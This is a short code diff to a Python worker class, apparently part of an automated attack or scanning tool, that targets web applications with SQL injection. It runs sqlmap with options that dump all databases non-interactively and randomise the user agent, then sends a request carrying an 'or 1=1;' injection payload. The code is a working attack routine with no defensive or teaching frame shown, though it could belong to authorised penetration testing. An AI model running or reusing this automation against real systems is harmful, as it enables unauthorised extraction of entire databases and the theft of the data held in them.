@@ -18,16 +18,18 @@ class SqlInjectionWorker(BaseWorker):
         target = self.serialized_data.get("target")
 
         if "http" not in target:
-            target = f"http://{target}:10201/get/?id=1"
-
-        process = subprocess.run(
-            args=[
-                "sqlmap", "-u", target,
-                "-a", "--batch", "--dump-all", "--random-agent"
-            ],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
+            target = f"http://{target}:80/get/?id=1"
+        try:
+            process = subprocess.run(
+                args=[
+                    "sqlmap", "-u", target,
+                    "-a", "--batch", "--dump-all", "--random-agent"
+                ],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+        except Exception as ex:
+            print(ex)
 
         r = requests.get(f"{target} or 1=1;")
 
